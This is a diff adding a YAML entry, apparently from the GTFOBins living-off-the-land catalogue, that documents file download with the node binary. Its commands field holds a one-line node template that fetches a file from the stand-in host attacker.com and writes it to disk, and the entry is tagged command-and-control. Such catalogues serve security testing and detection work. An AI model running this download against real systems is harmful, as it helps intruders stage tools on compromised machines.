@@ -1,0 +1,23 @@
+id: gtfobins/node/download/unprivileged
+type: binary
+platform: linux
+name: node
+phases:
+- command-and-control
+capabilities:
+- file-download
+privilege_required: user
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: node -e 'require("http").get("http://attacker.com/path/to/input-file", res => res.pipe(require("fs").createWriteStream("/path/to/output-file")))'
+references:
+- https://gtfobins.github.io/gtfobins/node/
+tags:
+- linux
+- unix
+- gtfobins
